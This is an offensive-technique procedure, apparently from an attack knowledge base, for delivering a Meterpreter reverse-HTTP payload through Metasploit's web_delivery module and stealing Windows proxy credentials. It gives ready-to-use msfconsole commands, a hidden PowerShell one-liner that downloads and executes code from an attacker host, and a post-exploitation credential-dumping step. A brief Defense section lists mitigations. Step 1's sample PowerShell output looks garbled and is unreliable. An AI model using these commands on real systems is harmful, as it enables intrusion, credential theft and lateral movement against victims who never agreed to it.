---
id: 5cc688e5-082d-4b73-ada1-11b68bdca7f6
name: Deliver-Meterpreter-Payload-via-Web-Delivery-and-Steal-Proxy-Credentials
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:21.344436+00:00'
updated_at: '2023-04-10T20:25:00.358824+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Remote File Copy|T1105 - Remote File Copy]]'
  - >-
    [[techniques/Signed Binary Proxy Execution|T1218 - Signed Binary Proxy
    Execution]]
sub_techniques: []
tags:
  - '[[tags/Metasploit]]'
  - '[[tags/Meterpreter - Basic]]'
  - '[[tags/Meterpreter Webdelivery]]'
commands:
  - '[[commands/msfconsole-web-delivery-setup]]'
  - '[[commands/powershell-proxy-credential-steal-and-execute]]'
platforms:
  - Windows
tools:
  - '[[tools/Metasploit]]'
validated: true
---

# Deliver-Meterpreter-Payload-via-Web-Delivery-and-Steal-Proxy-Credentials

## Summary

This procedure uses Metasploit's web_delivery module to generate a PowerShell command that downloads and executes a Meterpreter payload over HTTP, establishing a reverse shell connection to the attacker's listener. Once the session is active, it leverages Meterpreter's proxy credential stealer to extract stored proxy credentials from the target Windows system, enabling potential lateral movement across the network by impersonating the victim's proxy authentication.

## Description

In this technique, an attacker first sets up a listener using Metasploit's multi/script/web_delivery exploit module, which hosts a payload stager on an HTTP server. The generated PowerShell command is then delivered to the target (e.g., via phishing or social engineering) and executed, causing the target to download and run the Meterpreter payload. This results in a command-and-control (C2) channel via reverse HTTP. With the Meterpreter session established, the attacker runs a post-exploitation module to dump proxy credentials from the system's credential store, such as those used for authenticated proxy servers in corporate environments. This is particularly effective against Windows systems where users may have stored proxy credentials for internet access, allowing the attacker to pivot to internal resources. The approach evades detection by using signed binaries like PowerShell and leveraging legitimate proxy mechanisms.

## Requirements

1. Metasploit Framework installed on the attacker's system with network access to the target.
2. Target system running Windows (x64 preferred) with PowerShell enabled and internet access to the attacker's HTTP server.
3. Knowledge of the target's proxy configuration if pivoting is planned; no prior credentials needed for initial delivery.
4. Attacker's IP and port accessible from the target, with a firewall allowing inbound HTTP connections on the listener port.

## Defense

- Implement application whitelisting to restrict PowerShell execution and monitor for unusual PowerShell processes (e.g., via Sysmon or PowerShell logging).
- Use network segmentation and proxy authentication with short-lived tokens or certificate-based auth to limit credential reuse.
- Monitor for anomalous HTTP downloads from internal systems and Meterpreter-like C2 traffic (e.g., beacons to unusual IPs).
- Enable Windows Credential Guard to protect stored credentials and audit proxy settings changes.

## Objectives

1. Establish a Meterpreter reverse shell session on the target Windows system via HTTP payload delivery.
2. Extract and exfiltrate proxy credentials from the target's credential cache for network pivoting.
3. Maintain persistence and enable lateral movement using stolen proxy authentication.

## Instructions

### Step 1: Set Up Web Delivery Listener in Metasploit

**Context**: Launch Metasploit console and configure the web_delivery module to host the payload stager. This generates the PowerShell command for delivery to the target.

**Command** ([[commands/msfconsole-web-delivery-setup]]):

```msfconsole
use exploit/multi/script/web_delivery
set TARGET 2
set payload windows/x64/meterpreter/reverse_http
set LHOST 10.0.0.1
set LPORT 4444
run
```

> This sequence selects the web_delivery exploit for Windows (TARGET 2), sets a 64-bit Meterpreter reverse HTTP payload, configures the attacker's IP (LHOST) and port (LPORT), and starts the HTTP server on port 8080 by default. Expected output includes a generated PowerShell command like 'powershell.exe -nop -w hidden -c $j=[System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR((New-Object System.Net.NetworkCredential('','$_LHOST:$_LPORT')).Password))' which the attacker copies for delivery. Success is indicated by the module running and hosting the stager URL (e.g., http://10.0.0.1:8080/...).

### Step 2: Deliver and Execute Payload on Target

**Context**: On the target system, execute the generated PowerShell command to download and run the Meterpreter payload, establishing the C2 session.

**Command** ([[commands/powershell-proxy-credential-steal-and-execute]]):

```powershell
powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRequest]::GetSystemWebProxy();$g.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $g.downloadstring('http://10.0.0.1:8080/rYDPPB');
```

> This one-liner creates a hidden PowerShell process that sets up a web client with the system's default proxy and credentials, then invokes (IEX) the downloaded script from the web_delivery URL. It combines proxy usage with payload execution. Expected output is silent on success, but the attacker sees a new Meterpreter session in the msfconsole listener. If proxy creds are required, they are automatically used; verify by checking for the session in Metasploit.

### Step 3: Steal Proxy Credentials via Meterpreter Session

**Context**: With the Meterpreter session active, load the post module to dump proxy credentials from the Windows credential store.

**Instructions**: In the Meterpreter shell, run 'run post/windows/gather/credentials/windows_proxy_creds'. This module enumerates and extracts proxy auth details from the registry and credential manager.

> Expected output includes dumped credentials like username:password pairs for configured proxies (e.g., NTLM or Basic auth). Success is indicated by the module reporting 'Found X proxy credentials' and displaying them in the console for exfiltration.
